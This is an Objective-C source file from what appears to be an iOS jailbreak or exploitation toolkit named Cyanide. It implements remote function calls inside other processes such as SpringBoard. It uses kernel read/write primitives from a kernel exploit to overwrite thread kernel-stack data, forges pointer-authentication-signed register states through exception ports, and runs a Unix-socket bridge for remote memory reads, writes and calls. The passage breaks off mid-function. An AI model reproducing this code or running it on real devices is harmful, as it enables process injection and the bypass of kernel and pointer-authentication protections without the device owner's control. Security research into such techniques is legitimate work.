//
//  remote_call.m
//  Cyanide
//
//  Created by seo on 3/29/26.
//

#import <Foundation/Foundation.h>
#import <mach/mach.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import <pthread.h>
#import <errno.h>
#import <stdint.h>
#import <stdlib.h>
#import <string.h>
#import <sys/mman.h>
#import <sys/socket.h>
#import <sys/time.h>
#import <sys/types.h>
#import <sys/un.h>

#import "RemoteCall.h"
#import "VM.h"
#import "Exception.h"
#import "PAC.h"
#import "Thread.h"
#import "MigFilterBypassThread.h"
#import "../kexploit/kexploit_opa334.h"
#import "../kexploit/krw.h"
#import "../kexploit/offsets.h"
#import "../kexploit/kutils.h"
#import "../kexploit/xpaci.h"
#import "../utils/process.h"
#import "../cyanide-vphone/vphone_krw.h"

extern bool gIsPACSupported;
extern kern_return_t mach_vm_deallocate(task_t task, mach_vm_address_t address, mach_vm_size_t size);

// xnu-10002.81.5/osfmk/kern/exc_guard.h
#define EXC_GUARD_ENCODE_TYPE(code, type) \
    ((code) |= (((uint64_t)(type) & 0x7ull) << 61))
#define EXC_GUARD_ENCODE_FLAVOR(code, flavor) \
    ((code) |= (((uint64_t)(flavor) & 0x1fffffffull) << 32))
#define EXC_GUARD_ENCODE_TARGET(code, target) \
    ((code) |= (((uint64_t)(target) & 0xffffffffull)))


// xnu-10002.81.5/osfmk/mach/arm/_structs.h
#define __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK 0xff000000
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR 0x2
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC 0x4
#define __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR 0x8

// from pe_main.js
#define SHMEM_CACHE_SIZE                256
#define FAKE_PC_TROJAN_CREATOR          0x101
#define FAKE_LR_TROJAN_CREATOR          0x201
#define FAKE_PC_TROJAN                  0x301
#define FAKE_LR_TROJAN                  0x401

// from https://github.com/nickingravallo/Machium/blob/main/Machium/Breakpoint.h
#define BREAKPOINT_ENABLE 481
#define BREAKPOINT_DISABLE 0

uint64_t g_RC_targetProcOverride = 0;
uint64_t g_RC_gadgetPacia = 0;
static __thread RemoteCallInitFailure g_RC_lastInitFailure = RemoteCallInitFailureNone;
static __thread uint32_t g_RC_lastInitFailurePid = 0;

extern int proc_listallpids(void *buffer, int buffersize);
extern int proc_name(int pid, void *buffer, uint32_t buffersize);

static pid_t remote_call_find_userland_pid_by_name(const char *process)
{
    if (!process || !process[0]) return 0;

    int count = proc_listallpids(NULL, 0);
    if (count <= 0 || count > 65536) return 0;

    pid_t *pids = calloc((size_t)count, sizeof(pid_t));
    if (!pids) return 0;

    int got = proc_listallpids(pids, count * (int)sizeof(pid_t));
    pid_t found = 0;
    char nameBuf[1024] = {0};
    for (int i = 0; i < got && i < count; i++) {
        pid_t pid = pids[i];
        if (pid <= 0) continue;
        memset(nameBuf, 0, sizeof(nameBuf));
        if (proc_name(pid, nameBuf, sizeof(nameBuf)) <= 0) continue;
        if (strcmp(nameBuf, process) == 0) {
            found = pid;
            break;
        }
    }

    free(pids);
    return found;
}

typedef struct RemoteCallState {
    uint64_t taskAddr;
    bool creatingExtraThread;
    mach_port_t firstExceptionPort;
    mach_port_t secondExceptionPort;
    uint64_t firstExceptionPortAddr;
    uint64_t secondExceptionPortAddr;
    pthread_t dummyThread;
    mach_port_t dummyThreadMach;
    uint64_t dummyThreadAddr;
    uint64_t dummyThreadTro;
    uint64_t selfThreadAddr;
    uint32_t selfThreadCtid;
    arm_thread_state64_internal originalState;
    uint64_t vmMap;
    uint64_t callThreadAddr;
    uint64_t trojanThreadAddr;
    int pid;
    bool success;
    NSMutableArray<NSNumber *> *threadList;
    uint64_t trojanMem;
    struct VMShmem shmemCache[SHMEM_CACHE_SIZE];
    uint64_t shmemUseCounter[SHMEM_CACHE_SIZE];
    uint64_t shmemClock;
    uint64_t shmemEvictions;
    int firstExceptionTimeoutMS;
    int stableExceptionTimeoutFloorMS;
    bool originalThreadOnly;
    bool vphoneBridgeMode;
    int vphoneBridgeFD;
} RemoteCallState;

static RemoteCallState g_RC_defaultState = { .success = true, .stableExceptionTimeoutFloorMS = 10000, .vphoneBridgeFD = -1 };
static __thread RemoteCallState *g_RC_currentState;

@interface RemoteCallSession ()
- (RemoteCallState *)remoteCallStatePointer;
@end

static RemoteCallState *remote_call_current_state(void)
{
    if (!g_RC_currentState)
        g_RC_currentState = &g_RC_defaultState;
    return g_RC_currentState;
}

static RemoteCallState *remote_call_push_state(RemoteCallState *state)
{
    RemoteCallState *previous = remote_call_current_state();
    g_RC_currentState = state ?: &g_RC_defaultState;
    return previous;
}

static void remote_call_pop_state(RemoteCallState *previous)
{
    g_RC_currentState = previous ?: &g_RC_defaultState;
}

#define g_RC_taskAddr              (remote_call_current_state()->taskAddr)
#define g_RC_creatingExtraThread   (remote_call_current_state()->creatingExtraThread)
#define g_RC_firstExceptionPort    (remote_call_current_state()->firstExceptionPort)
#define g_RC_secondExceptionPort   (remote_call_current_state()->secondExceptionPort)
#define g_RC_firstExceptionPortAddr  (remote_call_current_state()->firstExceptionPortAddr)
#define g_RC_secondExceptionPortAddr (remote_call_current_state()->secondExceptionPortAddr)
#define g_RC_dummyThread           (remote_call_current_state()->dummyThread)
#define g_RC_dummyThreadMach       (remote_call_current_state()->dummyThreadMach)
#define g_RC_dummyThreadAddr       (remote_call_current_state()->dummyThreadAddr)
#define g_RC_dummyThreadTro        (remote_call_current_state()->dummyThreadTro)
#define g_RC_selfThreadAddr        (remote_call_current_state()->selfThreadAddr)
#define g_RC_selfThreadCtid        (remote_call_current_state()->selfThreadCtid)
#define g_RC_originalState         (remote_call_current_state()->originalState)
#define g_RC_vmMap                 (remote_call_current_state()->vmMap)
#define g_RC_callThreadAddr        (remote_call_current_state()->callThreadAddr)
#define g_RC_trojanThreadAddr      (remote_call_current_state()->trojanThreadAddr)
#define g_RC_pid                   (remote_call_current_state()->pid)
#define g_RC_success               (remote_call_current_state()->success)
#define g_RC_threadList            (remote_call_current_state()->threadList)
#define g_RC_trojanMem             (remote_call_current_state()->trojanMem)
#define g_RC_shmemCache            (remote_call_current_state()->shmemCache)
#define g_RC_shmemUseCounter       (remote_call_current_state()->shmemUseCounter)
#define g_RC_shmemClock            (remote_call_current_state()->shmemClock)
#define g_RC_shmemEvictions        (remote_call_current_state()->shmemEvictions)
#define g_RC_firstExceptionTimeoutMS (remote_call_current_state()->firstExceptionTimeoutMS)
#define g_RC_stableExceptionTimeoutFloorMS (remote_call_current_state()->stableExceptionTimeoutFloorMS)
#define g_RC_originalThreadOnly      (remote_call_current_state()->originalThreadOnly)
#define g_RC_vphoneBridgeMode        (remote_call_current_state()->vphoneBridgeMode)
#define g_RC_vphoneBridgeFD          (remote_call_current_state()->vphoneBridgeFD)

static void remote_call_note_init_failure(RemoteCallInitFailure failure, uint32_t pid)
{
    g_RC_lastInitFailure = failure;
    g_RC_lastInitFailurePid = pid;
}

RemoteCallInitFailure remote_call_last_init_failure(void)
{
    return g_RC_lastInitFailure;
}

uint32_t remote_call_last_init_failure_pid(void)
{
    return g_RC_lastInitFailurePid;
}

const char *remote_call_init_failure_description(RemoteCallInitFailure failure)
{
    switch (failure) {
        case RemoteCallInitFailureNone: return "none";
        case RemoteCallInitFailureKRWUnavailable: return "KRW unavailable";
        case RemoteCallInitFailureProcessMissing: return "process not found";
        case RemoteCallInitFailureInvalidTask: return "invalid task";
        case RemoteCallInitFailureExceptionPort: return "exception port setup failed";
        case RemoteCallInitFailureTaskGuard: return "task EXC_GUARD setup failed";
        case RemoteCallInitFailureLocalThread: return "local bootstrap thread setup failed";
        case RemoteCallInitFailureNoTargetThreads: return "no injectable target threads";
        case RemoteCallInitFailureFirstExceptionTimeout: return "target did not deliver bootstrap exception";
        case RemoteCallInitFailureOther: return "other RemoteCall init failure";
    }
    return "unknown RemoteCall init failure";
}

static bool remote_call_verbose_logging(void)
{
    const char *env = getenv("RC_VERBOSE");
    return env && env[0] && strcmp(env, "0") != 0;
}

#define RC_DEBUG(...) do { if (remote_call_verbose_logging()) printf(__VA_ARGS__); } while (0)

#define CY_VPHONE_SB_MAGIC 0x43595342u /* CYSB */
#define CY_VPHONE_SB_VERSION 1u
#define CY_VPHONE_SB_SOCKET "/private/var/mobile/Library/Caches/com.zeroxjf.cyanide.vphone-springboard.sock"

enum {
    CY_VPHONE_SB_CMD_PING = 1,
    CY_VPHONE_SB_CMD_CALL_NAME = 2,
    CY_VPHONE_SB_CMD_CALL_ADDR = 3,
    CY_VPHONE_SB_CMD_READ = 4,
    CY_VPHONE_SB_CMD_WRITE = 5,
};

typedef struct __attribute__((packed)) {
    uint32_t magic;
    uint32_t cmd;
    uint64_t addr;
    uint64_t len;
    uint64_t args[8];
    char name[128];
} cy_vphone_sb_req_t;

typedef struct __attribute__((packed)) {
    uint32_t magic;
    int32_t status;
    uint64_t value;
    uint64_t len;
} cy_vphone_sb_resp_t;

static bool vphone_bridge_read_full(int fd, void *buf, size_t len)
{
    uint8_t *p = (uint8_t *)buf;
    while (len > 0) {
        ssize_t n = read(fd, p, len);
        if (n < 0 && errno == EINTR) continue;
        if (n <= 0) return false;
        p += (size_t)n;
        len -= (size_t)n;
    }
    return true;
}

static bool vphone_bridge_write_full(int fd, const void *buf, size_t len)
{
    const uint8_t *p = (const uint8_t *)buf;
    while (len > 0) {
        ssize_t n = write(fd, p, len);
        if (n < 0 && errno == EINTR) continue;
        if (n <= 0) return false;
        p += (size_t)n;
        len -= (size_t)n;
    }
    return true;
}

static void vphone_bridge_set_timeout(int fd, int timeoutMS)
{
    int seconds = 30;
    if (timeoutMS > 0) {
        seconds = (timeoutMS + 999) / 1000;
        if (seconds < 1) seconds = 1;
        if (seconds > 120) seconds = 120;
    }

    struct timeval tv = { .tv_sec = seconds, .tv_usec = 0 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
}

static int vphone_bridge_open_fd(int timeoutMS)
{
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) return -1;

    vphone_bridge_set_timeout(fd, timeoutMS);

    struct sockaddr_un addr;
    memset(&addr, 0, sizeof(addr));
    addr.sun_family = AF_UNIX;
    strlcpy(addr.sun_path, CY_VPHONE_SB_SOCKET, sizeof(addr.sun_path));

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        close(fd);
        return -1;
    }

    return fd;
}

static bool vphone_bridge_request_on_fd(int fd,
                                        const cy_vphone_sb_req_t *req,
                                        const void *writeData,
                                        size_t writeLen,
                                        cy_vphone_sb_resp_t *respOut,
                                        void *readData,
                                        size_t readLen,
                                        int timeoutMS)
{
    if (fd < 0 || !req || !respOut) return false;
    vphone_bridge_set_timeout(fd, timeoutMS);

    if (!vphone_bridge_write_full(fd, req, sizeof(*req)) ||
        (writeData && writeLen > 0 &&
         !vphone_bridge_write_full(fd, writeData, writeLen))) {
        return false;
    }

    cy_vphone_sb_resp_t resp;
    if (!vphone_bridge_read_full(fd, &resp, sizeof(resp)) ||
        resp.magic != CY_VPHONE_SB_MAGIC) {
        return false;
    }

    if (readData && readLen > 0) {
        if (resp.status != 0 || resp.len != readLen ||
            !vphone_bridge_read_full(fd, readData, readLen)) {
            return false;
        }
    }

    *respOut = resp;
    return resp.status == 0;
}

bool remote_call_vphone_springboard_bridge_available(void)
{
    int fd = vphone_bridge_open_fd(1500);
    if (fd < 0) return false;

    cy_vphone_sb_req_t req = {
        .magic = CY_VPHONE_SB_MAGIC,
        .cmd = CY_VPHONE_SB_CMD_PING,
    };
    cy_vphone_sb_resp_t resp = {0};
    bool ok = vphone_bridge_request_on_fd(fd, &req, NULL, 0, &resp, NULL, 0, 1500) &&
              resp.value == CY_VPHONE_SB_VERSION;
    close(fd);
    return ok;
}

static void vphone_bridge_close_current(void)
{
    if (g_RC_vphoneBridgeFD >= 0) {
        close(g_RC_vphoneBridgeFD);
        g_RC_vphoneBridgeFD = -1;
    }
}

static bool vphone_bridge_connect_current(int timeoutMS)
{
    if (g_RC_vphoneBridgeFD >= 0) return true;

    int fd = vphone_bridge_open_fd(timeoutMS);
    if (fd < 0) return false;

    g_RC_vphoneBridgeFD = fd;
    return true;
}

static bool vphone_bridge_request_current(cy_vphone_sb_req_t *req,
                                          const void *writeData,
                                          size_t writeLen,
                                          cy_vphone_sb_resp_t *resp,
                                          void *readData,
                                          size_t readLen,
                                          int timeoutMS)
{
    if (!vphone_bridge_connect_current(timeoutMS)) return false;

    if (!vphone_bridge_request_on_fd(g_RC_vphoneBridgeFD,
                                    req,
                                    writeData,
                                    writeLen,
                                    resp,
                                    readData,
                                    readLen,
                                    timeoutMS)) {
        vphone_bridge_close_current();
        return false;
    }
    return true;
}

static bool remote_call_should_log_result(const char *name, bool stable);

static uint64_t vphone_bridge_call(uint32_t cmd,
                                   uint64_t pcAddr,
                                   const char *name,
                                   int timeout,
                                   uint64_t x0,
                                   uint64_t x1,
                                   uint64_t x2,
                                   uint64_t x3,
                                   uint64_t x4,
                                   uint64_t x5,
                                   uint64_t x6,
                                   uint64_t x7)
{
    cy_vphone_sb_req_t req = {
        .magic = CY_VPHONE_SB_MAGIC,
        .cmd = cmd,
        .addr = pcAddr,
        .args = { x0, x1, x2, x3, x4, x5, x6, x7 },
    };
    if (name) {
        strlcpy(req.name, name, sizeof(req.name));
    }

    cy_vphone_sb_resp_t resp = {0};
    if (!vphone_bridge_request_current(&req, NULL, 0, &resp, NULL, 0, timeout)) {
        printf("[RemoteCall] VPHONE SpringBoard bridge call failed: %s status=%d value=0x%llx\n",
               name ?: "(addr-call)", resp.status, resp.value);
        g_RC_success = false;
        return 0;
    }

    uint64_t retValue = resp.value;
    if (remote_call_should_log_result(name, true))
        printf("[%s:%d] %s func's retValue = 0x%llx(%llu) via vphone bridge\n",
               __FUNCTION__, __LINE__, name ?: "(addr-call)", retValue, retValue);
    return retValue;
}

static bool vphone_bridge_remote_read(uint64_t src, void *dst, uint64_t size)
{
    if (!src || !dst || !size || size > 0x100000) return false;

    cy_vphone_sb_req_t req = {
        .magic = CY_VPHONE_SB_MAGIC,
        .cmd = CY_VPHONE_SB_CMD_READ,
        .addr = src,
        .len = size,
    };
    cy_vphone_sb_resp_t resp = {0};
    if (!vphone_bridge_request_current(&req, NULL, 0, &resp, dst, (size_t)size, 5000)) {
        g_RC_success = false;
        return false;
    }
    return true;
}

static bool vphone_bridge_remote_write(uint64_t dst, const void *src, uint64_t size)
{
    if (!dst || !src || !size || size > 0x100000) return false;

    cy_vphone_sb_req_t req = {
        .magic = CY_VPHONE_SB_MAGIC,
        .cmd = CY_VPHONE_SB_CMD_WRITE,
        .addr = dst,
        .len = size,
    };
    cy_vphone_sb_resp_t resp = {0};
    if (!vphone_bridge_request_current(&req, src, (size_t)size, &resp, NULL, 0, 5000)) {
        g_RC_success = false;
        return false;
    }
    return true;
}

static bool remote_call_should_log_result(const char *name, bool stable)
{
    if (remote_call_verbose_logging())
        return true;

    if (!name)
        return true;

    static const char *quietSymbols[] = {
        "malloc",
        "free",
        "objc_msgSend",
        "objc_msgSendSuper",
        "objc_msgSendSuper2",
        "sel_registerName",
        "sel_getUid",
        "objc_getClass",
        "objc_lookUpClass",
        "objc_allocateClassPair",
        "object_getClass",
        "object_getClassName",
        "class_getName",
        "class_getSuperclass",
        "class_getInstanceMethod",
        "class_getClassMethod",
        "class_getInstanceVariable",
        "class_getInstanceSize",
        "class_respondsToSelector",
        "method_getTypeEncoding",
        "method_getName",
        "method_getImplementation",
        "ivar_getOffset",
        "ivar_getName",
        "ivar_getTypeEncoding",
        "strdup",
        "strcmp",
        "strlen",
        "memcpy",
        "memcmp",
        "CFStringCreateWithCString",
        "CFStringCreateWithCStringNoCopy",
        "CFStringGetCStringPtr",
        "CFStringGetLength",
        "CFNumberGetValue",
        "CFRelease",
        "CFRetain",
        "dlopen",
        "dlsym",
        "dladdr",
        "IOServiceMatching",
        "IOServiceGetMatchingService",
        "IORegistryEntryCreateCFProperty",
        "IOObjectRelease",
        "memset",
        "getpid",
        "pthread_create_suspended_np",
        "pthread_mach_thread_np",
        "thread_resume",
        "mmap",
        "sandbox_extension_issue_file",
        "sandbox_extension_issue_file_to_process",
        "sandbox_extension_consume",
    };

    for (size_t i = 0; i < sizeof(quietSymbols) / sizeof(quietSymbols[0]); i++) {
        if (strcmp(name, quietSymbols[i]) == 0)
            return false;
    }

    // Log-once symbols: emit the first invocation so it's visible in the log,
    // then go silent so per-window / per-iteration loops don't flood. CAS
    // means concurrent first-callers never both win.
    static struct { const char *name; volatile int logged; } logOnceTable[] = {
        { "objc_setAssociatedObject", 0 },
        { "objc_getAssociatedObject", 0 },
    };
    for (size_t i = 0; i < sizeof(logOnceTable) / sizeof(logOnceTable[0]); i++) {
        if (strcmp(name, logOnceTable[i].name) == 0) {
            return __sync_bool_compare_and_swap(&logOnceTable[i].logged, 0, 1);
        }
    }

    if (!stable)
        return true;

    return true;
}

static void release_shmem_slot(int i)
{
    if (i < 0 || i >= SHMEM_CACHE_SIZE) return;
    if (g_RC_shmemCache[i].localAddress) {
        mach_vm_deallocate(mach_task_self_,
                           (mach_vm_address_t)g_RC_shmemCache[i].localAddress,
                           PAGE_SIZE);
    }
    if (g_RC_shmemCache[i].port) {
        mach_port_deallocate(mach_task_self_, (mach_port_name_t)g_RC_shmemCache[i].port);
    }
    memset(&g_RC_shmemCache[i], 0, sizeof(g_RC_shmemCache[i]));
    g_RC_shmemUseCounter[i] = 0;
}

static void clear_remote_shmem_cache(void)
{
    for (int i = 0; i < SHMEM_CACHE_SIZE; i++) {
        if (g_RC_shmemCache[i].used) release_shmem_slot(i);
    }
    g_RC_shmemClock = 0;
    g_RC_shmemEvictions = 0;
}

static uint32_t reap_dead_port_names(const char *reason)
{
    mach_port_name_array_t names = NULL;
    mach_port_type_array_t types = NULL;
    mach_msg_type_number_t namesCount = 0;
    mach_msg_type_number_t typesCount = 0;
    kern_return_t kr = mach_port_names(mach_task_self_, &names, &namesCount, &types, &typesCount);
    if (kr != KERN_SUCCESS) return 0;

    mach_msg_type_number_t limit = namesCount < typesCount ? namesCount : typesCount;
    uint32_t dead = 0;
    for (mach_msg_type_number_t i = 0; i < limit; i++) {
        if ((types[i] & MACH_PORT_TYPE_DEAD_NAME) == 0) continue;
        if (mach_port_deallocate(mach_task_self_, names[i]) == KERN_SUCCESS) {
            dead++;
        }
    }

    if (dead && remote_call_verbose_logging()) {
        static volatile uint64_t reapTotal = 0;
        static volatile uint64_t reapEvents = 0;
        uint64_t total = __sync_add_and_fetch(&reapTotal, dead);
        uint64_t events = __sync_add_and_fetch(&reapEvents, 1);
        printf("[RemoteCall] reaped %u ports current=%u cumulative=%llu events=%llu\n",
               dead, namesCount, (unsigned long long)total, (unsigned long long)events);
    }

    if (names) {
        vm_deallocate(mach_task_self_,
                      (vm_address_t)names,
                      (vm_size_t)namesCount * sizeof(mach_port_name_t));
    }
    if (types) {
        vm_deallocate(mach_task_self_,
                      (vm_address_t)types,
                      (vm_size_t)typesCount * sizeof(mach_port_type_t));
    }
    return dead;
}

static void reap_dead_port_names_if_needed(const char *reason)
{
    static volatile uint32_t signCount = 0;
    uint32_t count = __sync_add_and_fetch(&signCount, 1);
    if ((count & 0x3f) != 0) return;
    (void)reap_dead_port_names(reason);
}

bool set_exception_port_on_thread(mach_port_t exceptionPort, uint64_t currThread, bool useMigFilterBypass) {
    bool success = false;
    
    void* thread_set_exception_ports_addr = dlsym(RTLD_DEFAULT, "thread_set_exception_ports");
    void* pthread_exit_addr = dlsym(RTLD_DEFAULT, "pthread_exit");
    if (!thread_set_exception_ports_addr || !pthread_exit_addr) {
        printf("[%s:%d] missing thread_set_exception_ports/pthread_exit symbols\n",
               __FUNCTION__, __LINE__);
        return false;
    }
    if (!is_kaddr_valid(currThread)) {
        printf("[%s:%d] invalid target thread %#llx\n",
               __FUNCTION__, __LINE__, currThread);
        return false;
    }
    if (!g_RC_dummyThreadMach || !is_kaddr_valid(g_RC_dummyThreadAddr)) {
        printf("[%s:%d] dummy thread unavailable mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, g_RC_dummyThreadMach, g_RC_dummyThreadAddr);
        return false;
    }
    
    pthread_t pthread = NULL;
    int createErr = pthread_create_suspended_np(&pthread, NULL,
        (void *(*)(void *))thread_set_exception_ports_addr, NULL);
    if (createErr != 0 || !pthread) {
        printf("[%s:%d] pthread_create_suspended_np failed err=%d thread=%p\n",
               __FUNCTION__, __LINE__, createErr, pthread);
        return false;
    }
    
    mach_port_t machThread = pthread_mach_thread_np(pthread);
    if (!machThread) {
        printf("[%s:%d] pthread_mach_thread_np returned null for helper thread\n",
               __FUNCTION__, __LINE__);
        pthread_cancel(pthread);
        return false;
    }
    uint64_t machThreadAddr = task_get_ipc_port_kobject(task_self(), machThread);
    if (!is_kaddr_valid(machThreadAddr)) {
        printf("[%s:%d] failed to resolve helper thread kobject mach=0x%x addr=%#llx\n",
               __FUNCTION__, __LINE__, machThread, machThreadAddr);
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }

    if(useMigFilterBypass) {
        mig_bypass_monitor_threads(g_RC_selfThreadAddr, machThreadAddr);
    }

    arm_thread_state64_internal state;
    memset(&state, 0, sizeof(state));
    mach_msg_type_number_t count = ARM_THREAD_STATE64_COUNT;
    kern_return_t kr = thread_get_state(machThread, ARM_THREAD_STATE64,
                                        (thread_state_t)&state, &count);
    if (kr != KERN_SUCCESS) {
        printf("[%s:%d] thread_get_state failed: 0x%x (%s)\n",
               __FUNCTION__, __LINE__, kr, mach_error_string(kr));
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }
    
    uint64_t diver = 0;
    diver = (uint64_t)state.__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
    
    arm_thread_state64_set_pc_fptr(state, thread_set_exception_ports_addr);
    arm_thread_state64_set_lr_fptr(state, pthread_exit_addr);
    
    uint64_t exceptionMask = EXC_MASK_GUARD |
                             EXC_MASK_BAD_ACCESS |
                             EXC_MASK_BAD_INSTRUCTION |
                             EXC_MASK_BREAKPOINT |
                             EXC_MASK_ARITHMETIC;

    state.__x[0] = g_RC_dummyThreadMach;
    state.__x[1] = exceptionMask;
    state.__x[2] = exceptionPort;
    state.__x[3] = EXCEPTION_STATE | MACH_EXCEPTION_CODES;
    state.__x[4] = ARM_THREAD_STATE64;
    
    if(useMigFilterBypass)
        usleep(100000);
    
    if (!thread_set_state_wrapper(machThread, machThreadAddr,
                                  (arm_thread_state64_internal *)&state))
    {
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }
    
    if(useMigFilterBypass)
        usleep(100000);
    
    thread_set_mutex(g_RC_dummyThreadAddr, g_RC_selfThreadCtid);
    
    if (!thread_resume_wrapper(machThread))
    {
        pthread_cancel(pthread);
        mach_port_deallocate(mach_task_self_, machThread);
        return false;
    }
    
    for (int i = 0; i < 10; i++)
    {
        usleep(200000);

        uint64_t kstack = thread_get_kstackptr(machThreadAddr);
        if (!is_kaddr_valid(kstack)) {
            printf("[%s:%d] Failed to get valid kstack (%#llx). Retry...\n",
                   __FUNCTION__, __LINE__, kstack);
            continue;
        }
        
        uint64_t kernelSP = kread64(kstack + off_arm_kernel_saved_state_sp);
        if (!is_kaddr_valid(kernelSP)) {
            printf("[%s:%d] Failed to get valid SP (%#llx). Retry...\n",
                   __FUNCTION__, __LINE__, kernelSP);
            continue;
        }
        usleep(100);

        uint64_t pageBase = trunc_page(kernelSP) + 0x3000ULL;
        if (!is_kaddr_valid(pageBase)) {
            printf("[%s:%d] invalid helper stack probe page %#llx\n",
                   __FUNCTION__, __LINE__, pageBase);
            continue;
        }
        char dataBuff[0x1000];
        memset(dataBuff, 0, 0x1000);
        kreadbuf(pageBase, &dataBuff, 0x1000);

        uint64_t needleVal = g_RC_dummyThreadTro;
        void *match = memmem(dataBuff, 0x1000, &needleVal, sizeof(needleVal));
        if (!match) {
            printf("[%s:%d] Couldn't find g_RC_dummyThreadTro\n", __FUNCTION__, __LINE__);
            continue;
        }
        size_t foundOffset = (size_t)((uint8_t *)match - (uint8_t *)dataBuff);
        uint64_t found = (uint64_t)foundOffset + 0x3000;
        memset(dataBuff, 0, 0x1000);
        
        bool correctTro = false;
        uint64_t checkAddr = trunc_page(kernelSP) + found + 0x18ULL;
        uint64_t checkVal  = kread64(checkAddr);
        
        uint64_t checkAddr2 = trunc_page(kernelSP) + found + 0x10ULL;   // on iPad 7(arm64)/18.3.2, offsets may be different
        uint64_t checkVal2  = kread64(checkAddr2);

        if (checkVal == exceptionMask || checkVal2 == exceptionMask) {
            correctTro = true;
        } else {
            printf("[%s:%d] Wrong tro (%#llx/%#llx != %#llx). Retry...\n",
                   __FUNCTION__, __LINE__, checkVal, checkVal2, exceptionMask);
//            printf("[%s:%d] Wrong tro = 0x%llx (kread64 from 0x%llx, trunc_page(kernelSP) = 0x%llx), Retry...\n", __FUNCTION__, __LINE__, checkVal, checkAddr, trunc_page(kernelSP));
//            khexdump(trunc_page(kernelSP), 0x4000);
//            while(1) {};
            continue;
        }
        
        if (found && correctTro) {
            if (thread_get_task(currThread) == g_RC_taskAddr) {
                uint64_t tro = thread_get_t_tro(currThread);
                if (!is_kaddr_valid(tro)) {
                    printf("[%s:%d] target thread tro invalid %#llx\n",
                           __FUNCTION__, __LINE__, tro);
                    continue;
                }
                kwrite64(trunc_page(kernelSP) + found, tro);
                success = true;
                break;
            } else {
                printf("[%s:%d] got empty tro, skip writing\n", __FUNCTION__, __LINE__);
            }
        } else {
            NSLog(@"[%s:%d] didnt find tro for 0x%llx", __FUNCTION__, __LINE__, (uint64_t)currThread);
        }
    }
    
    thread_set_mutex(g_RC_dummyThreadAddr, 0x40000000);
    
    thread_set_exception_ports(g_RC_dummyThreadMach, 0, exceptionPort, EXCEPTION_STATE | MACH_EXCEPTION_CODES, ARM_THREAD_STATE64);

    if(useMigFilterBypass)
        usleep(100000);

    mach_port_deallocate(mach_task_self_, machThread);
    return success;
}

void sign_state(uint64_t signingThread, arm_thread_state64_internal *state, uint64_t pc, uint64_t lr)
{
    reap_dead_port_names_if_needed("sign_state");

    if(gIsPACSupported) {
        uint64_t diver = 0;
        diver = (uint64_t)state->__flags & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
        uint64_t discPC = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("pc"));
        uint64_t discLR = ptrauth_blend_discriminator_wrapper(diver, ptrauth_string_discriminator_special("lr"));
        
        if (pc) {
            uint32_t flags = state->__flags;
            flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC;
            state->__flags = flags;
            state->__pc = remote_pac(signingThread, pc, discPC);
        }
        if (lr) {
            uint32_t flags = state->__flags;
            flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR |
                       __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR);
            state->__flags = flags;
            state->__lr = remote_pac(signingThread, lr, discLR);
        }
        return;
    }
    
    if(!gIsPACSupported) {
        if (pc) state->__pc = pc;
        if (lr) state->__lr = lr;
    }
}

bool remote_call_current_success(void)
{
    return g_RC_success;
}

int remote_call_current_pid(void)
{
    return g_RC_pid;
}

int remote_call_set_stable_timeout_floor_ms(int timeoutMS)
{
    int previous = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
    g_RC_stableExceptionTimeoutFloorMS = timeoutMS > 0 ? timeoutMS : 10000;
    return previous;
}

uint64_t do_remote_call_temp(int timeout, const char *name,
    uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3,
    uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7)
{
    int floorTimeout = g_RC_stableExceptionTimeoutFloorMS > 0 ? g_RC_stableExceptionTimeoutFloorMS : 10000;
    int newTimeout = (floorTimeout > timeout) ? floorTimeout : timeout;
    uint64_t pcAddr = native_strip((uint64_t)dlsym(RTLD_DEFAULT, name));

    ExceptionMessage exc;
    if (!wait_exception(g_RC_firstExceptionPort, &exc, newTimeout, false)) {
        printf("[%s:%d] Don't receive first exception on original thread\n", __FUNCTION__, __LINE__);
        g_RC_success = false;
        return 0;
    }

    exc.threadState.__x[0] = x0;
    exc.threadState.__x[1] = x1;
    exc.threadState.__x[2] = x2;
    exc.threadState.__x[3] = x3;
    exc.threadState.__x[4] = x4;
    exc.threadState.__x[5] = x5;
    exc.threadState.__x[6] = x6;
    exc.threadState.__x[7] = x7;
    sign_state(g_RC_trojanThreadAddr, &exc.threadState, pcAddr, FAKE_LR_TROJAN_CREATOR);
    reply_with_state(&exc, &exc.threadState);

    if (timeout < 0) {
        printf("[%s:%d] Trojan thread cleanup\n", __FUNCTION__, __LINE__);
        return 0;
    }

    ExceptionMessage exc2;
    if (!wait_exception(g_RC_firstExceptionPort, &exc2, newTimeout, false)) {
        printf("[%s:%d] Don't receive second exception on original thread\n", __FUNCTION__, __LINE__);
        g_RC_success = false;
        return 0;
    }
    uint64_t retValue = exc2.threadState.__x[0];
    reply_with_state(&exc2, &exc2.threadState);
    if (remote_call_should_log_result(name, false))
        printf("[%s:%d] %s func's retValue = 0x%llx(%llu)\n", __FUNCTION__, __LINE__, name, retValue, retValue);
    if(strcmp(name, "getpid") == 0 && retValue == 0) {
        printf("[%s:%d] getpid failed\n", __FUNCTION__, __LINE__);
